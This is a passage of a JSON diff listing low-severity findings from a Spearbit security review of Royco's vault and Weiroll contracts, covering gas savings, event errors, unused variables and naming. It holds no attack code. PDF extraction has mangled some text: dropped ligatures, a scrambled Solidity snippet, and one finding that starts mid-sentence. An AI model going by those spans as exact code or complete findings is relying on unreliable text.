+        "body": "The WrappedVault contract currently has a code size of 17,833 bytes. Since WrappedVault instances are created by the WrappedVaultFactory, minimizing the contract size is crucial to reduce de- ployment costs and avoid hitting the EVM's contract size limit. By switching from Solmate and OpenZeppelin libraries to their equivalents in the Solady library, you can signicantly reduce the contract size. Solady is designed to be more gas-ecient and often results in smaller bytecode.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Gas Optimization"
+        ]
+    },
+    {
+        "title": "Incorrect argument passed to event",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "instead block.timestamp is used. This mistake happens both times this event is emitted in setRewardsInterval() and extendRewardsInterval().",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Excessive use of vm.assume in tests",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The fuzzing tests incorrectly use an excessive amount of vm.assume which cause tests to fail intermittently with errors like: [FAIL. Reason: The (cid:44)   vm.assume cheatcode rejected too many inputs (65536 allowed)] testExtendRewardsInterval(uint32,uint32,uint32,uint256,uint256) (runs: 235, : 311446, ~: 315643) Per the Foundry book, prefer bound to vm.assume: The assume cheatcode should mainly be used for very narrow checks. Broad checks will slow down tests as it will take a while to nd valid values, and the test may fail if you hit the max number of rejects. For broad checks, such as ensuring a uint256 falls within a certain range, you can bound your input with the modulo operator or Forge Standards bound method.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Missing event when adding an IP",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "No event is emitted when adding a new incentive provider.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Inconsistent minimum amount levels used when creating offers",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "In the Points and the RecipeKernel contracts, a minimum amount value of 1e6 is enforced when creating IP or AP offers. // Check offer isn if (quantity < 1e6) { t empty  revert CannotPlaceZeroQuantityOffer(); } However, in the VaultKernel the minimum is 0 with the same error: // Check offer isn if (quantity == 0) {  t empty revert CannotPlaceZeroQuantityOffer(); }",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Unused state variables",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The state variables unlockRewardTokens, unlockRewardAmounts, and forfeitRecipient are declared in the WeirollWallet contract but are not utilized anywhere within the codebase. Unused vari- ables can lead to unnecessary increases in contract bytecode size and may cause confusion for developers reviewing or maintaining the contract.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Wrong WrappedVaultCreated event emission",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "In the wrapVault function, the getNextSymbol() function is called twice: once when creating a new WrappedVault instance and again when emitting the WrappedVaultCreated event. Between these two calls, the incentivizedVaults array is updated by adding the new vault. Since getNextSymbol() relies on incentivizedVaults.length, the second call generates a symbol that is incremented by one compared to the rst call. This results in a mismatch between the symbol assigned to the new vault and the symbol reported in the event.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Incorrect comment on isRecipeKernel mapping",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The comment above the isRecipeKernel mapping is incorrect, this comment mistakenly refers to \"Orderbook\" addresses instead of \"RecipeKernel\" addresses. The mapping actually keeps track of valid RecipeKernel addresses.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Include additional data in Award event for improved off-chain traceability",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The Award event currently emits only the recipient address (to) and the awarded amount (amount). Including msg.sender in the event emitted by award(address to, uint256 amount) would en- able off-chain systems to easily identify which vault issued the points. Similarly, including the ip (incen- tive provider) in the event emitted by award(address to, uint256 amount, address ip) would facilitate tracking of the incentive provider responsible for minting the points.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Flag denitions are not consistent with documentation",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "Weiroll denes a number of ags at the top of VM.sol, indicating the various command actions supported. The README suggests the rst bit of the ags byte is a tuple return and the second bit is an extended command. The current implementation has these as the other way around. In most cases, this is not an issue if it is recognised when generating the recipes, but it may create some confusion if this is not made known. uint256 constant FLAG_EXTENDED_COMMAND = 0x80; uint256 constant FLAG_TUPLE_RETURN = 0x40;",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "ExecutionFailed revert error does not include correct command_index",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "If there is any command in Weiroll's _execute() function which causes a revert, the Execu- tionFailed will propagate this up and halt recipe execution. The current implementation will not properly identify what command index caused the revert because ExecutionFailed simply doesn't include this in- formation.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Wrong naming in return value and comment on createIPOffer",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "On createIPOffer function the return value is named marketID, but it actually refers to the ID of the newly created offer, not the market. Also, the comment for the @return annotation should state \"offerID\" instead of \"marketID\" for clarity.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Pass owner as parameter to the constructor for exibility",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "In the VaultKernel contract, the constructor hardcodes msg.sender as the contract owner upon deployment. While this may be acceptable for straightforward deployments, it limits exibility in scenarios where the deployer is not intended to be the owner. This includes deployments via factory contracts, CREATE2, or any situation where ownership needs to be assigned to a different address.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Unused error OnlyClaimant",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The custom error OnlyClaimant() is declared but never utilized in the codebase.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Variables visibility should be explicit declared",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "In Solidity, state variables without an explicit visibility modier default to internal. While this is functionally acceptable, it is considered best practice to explicitly declare the visibility of all state variables:  VaultKernel.sol#L42: offersPaused has no explicit visibility.  WrappedVault.sol#L88: DEPOSIT_ASSET has no explicit visibility.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
+    },
+    {
+        "title": "Constructor arguments shadow inherited variables",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "In the constructor of WrappedVault there are two parameters named name and symbol. These parameters shadow the name and symbol variables inherited from the ERC20 contract.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Informational"
+        ]
     }
 ]
